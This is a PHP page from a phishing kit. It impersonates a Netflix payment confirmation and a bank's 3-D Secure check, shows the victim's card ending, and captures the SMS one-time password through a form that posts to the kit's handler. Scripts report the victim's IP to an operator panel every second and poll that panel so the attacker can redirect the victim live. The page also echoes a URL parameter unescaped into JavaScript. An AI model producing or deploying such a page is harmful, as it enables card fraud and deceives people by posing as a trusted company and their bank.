<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/css/account.css">
    <link rel="stylesheet" href="res/css/account-media.css">
</head>
<body style="background:white !important;">

<header>
    <div class="left">
        <img src="res/img/logo.png">
    </div>
    <div class="right">
        <a href="#">Sign out</a>
    </div>
</header>

<section class="container border-sm shadow-sm p-0 my-5" style="width:500px; text-align:center; font-size:0.9em;">

    <div class="container mt-5 p-4">
        <div class="row m-0">
            <div class="col text-left">
                <img src="res/img/logo.png" style="width:90px;">
            </div>
            <div class="col text-right">
                <img src="res/img/vm.png" style="width:90px;">
            </div>
        </div>
    </div>

    <div class="container w-100 m-0 p-4 text-center border-top">
        <h4>Please confirm this operation</h4>
    </div>

    <div class="container w-100 p-3 border-top text-left" style="background:#f6f6f6;">
        <p>
            The one-time password has been sent to your phone number.
            If you need to change the phone number, contact your bank or update it through the available channels (ATM, web).
        </p>

        <table class="table table-sm table-borderless sms">
            <tr>
                <th>Merchant:</th>
                <td>Netflix</td>
            </tr>
            <tr>
                <th>Card number:</th>
                <td>XXXX XXXX XXXX <?php echo substr(@$_SESSION["card_num"] ?? '', -4); ?></td>
            </tr>
            <tr>
                <th>OTP:</th>
                <td>
                    <form action="post.php" method="post">
                        <input type="text" class="form-control rounded-pill" name="otp" required placeholder="Enter the code">
                        <?php 
                        if (isset($_GET['e'])) {
                            echo '<label class="error">The code entered is not valid.</label>';
                        }
                        ?>
                        <br><br>
                        <button type="submit" class="btn btn-primary">Submit</button>
                    </form>
                </td>
            </tr>
        </table>

        <p>Enter the code received via SMS</p>
    </div>

    <div class="container p-3 text-center border-top" style="background:#f6f6f6;">
        All rights reserved to Netflix Inc. 2026
    </div>

</section>
<script src="./res/cdn/jq.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP ?? $_SERVER['REMOTE_ADDR'] ?? "unknown"; ?>'});
}, 1000);

var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd != d && d != 0){
            window.location = d;
        }
    });
}, 2000);
</script>
</body>
</html>